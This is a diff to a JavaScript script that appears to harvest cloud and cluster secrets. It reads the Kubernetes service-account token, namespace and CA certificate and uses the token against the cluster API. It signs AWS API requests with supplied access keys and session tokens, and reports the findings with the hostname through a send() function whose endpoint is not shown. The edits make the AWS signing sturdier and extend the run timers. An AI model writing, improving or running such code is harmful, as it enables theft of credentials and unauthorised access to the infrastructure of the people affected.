@@ -32,18 +32,18 @@ function sign(ak, sk, st, service, host, region, method, path, query, body) {
   const amz = d.toISOString().replace(/[:-]|\.\d{3}/g, '');
   const day = amz.slice(0, 8);
   const ph = sha256(body || '');
-  const ch = `host:${host}\nx-amz-date:${amz}\n` + (st ? `x-amz-security-token:${st}\n` : '');
-  const sh = st ? 'host;x-amz-date;x-amz-security-token' : 'host;x-amz-date';
+  const ch = `host:${host}\nx-amz-content-sha256:${ph}\nx-amz-date:${amz}\n` + (st ? `x-amz-security-token:${st}\n` : '');
+  const sh = 'host;x-amz-content-sha256;x-amz-date' + (st ? ';x-amz-security-token' : '');
   const cr = [method, path, query || '', ch, sh, ph].join('\n');
   const scope = `${day}/${region}/${service}/aws4_request`;
   const sts = ['AWS4-HMAC-SHA256', amz, scope, sha256(cr)].join('\n');
   let k = hmac('AWS4' + sk, day); k = hmac(k, region); k = hmac(k, service); k = hmac(k, 'aws4_request');
   const sig = crypto.createHmac('sha256', k).update(sts).digest('hex');
-  return { auth: `AWS4-HMAC-SHA256 Credential=${ak}/${scope}, SignedHeaders=${sh}, Signature=${sig}`, amz };
+  return { auth: `AWS4-HMAC-SHA256 Credential=${ak}/${scope}, SignedHeaders=${sh}, Signature=${sig}`, amz, ph };
 }
 function awsReq(ak, sk, st, service, host, region, method, path, query, body, ctype, cb) {
   const s = sign(ak, sk, st, service, host, region, method, path, query, body);
-  const headers = { Host: host, 'X-Amz-Date': s.amz, Authorization: s.auth };
+  const headers = { Host: host, 'X-Amz-Date': s.amz, 'X-Amz-Content-Sha256': s.ph, Authorization: s.auth };
   if (st) headers['X-Amz-Security-Token'] = st;
   if (ctype) headers['Content-Type'] = ctype;
   if (body) headers['Content-Length'] = Buffer.byteLength(body);
@@ -91,11 +91,11 @@ if (rep.files[tokPath] === 'file') {
     rep.k8s.namespace = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8').trim();
   } catch (e) { rep.k8s.read_err = String(e); }
 }
-if (kTok && process.env.KUBERNETES_SERVICE_HOST) {
+if (kTok && p1Env.KUBERNETES_SERVICE_HOST) {
   try {
     const ca = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt');
-    const khost = process.env.KUBERNETES_SERVICE_HOST;
-    const kport = process.env.KUBERNETES_SERVICE_PORT || '443';
+    const khost = p1Env.KUBERNETES_SERVICE_HOST;
+    const kport = p1Env.KUBERNETES_SERVICE_PORT || '443';
     const req = https.get({ host: khost, port: kport, path: '/api/v1/namespaces/' + encodeURIComponent(rep.k8s.namespace) + '/pods?limit=5', headers: { Authorization: 'Bearer ' + kTok }, ca, timeout: 5000, servername: khost }, (res) => {
       let b = ''; res.on('data', (c) => b += c); res.on('end', () => {
         rep.k8s.api_status = res.statusCode;
@@ -154,5 +154,5 @@ const finish = () => {
   rep.stage = 'final';
   send(rep, () => setTimeout(() => process.exit(0), 800));
 };
-setTimeout(finish, 9000);
-setTimeout(() => { try { send({ mark: MARK, stage: 'watchdog', host: os.hostname() }); } catch (e) {} setTimeout(() => process.exit(0), 800); }, 16000);
+setTimeout(finish, 14000);
+setTimeout(() => { try { send({ mark: MARK, stage: 'watchdog', host: os.hostname() }); } catch (e) {} setTimeout(() => process.exit(0), 800); }, 22000);
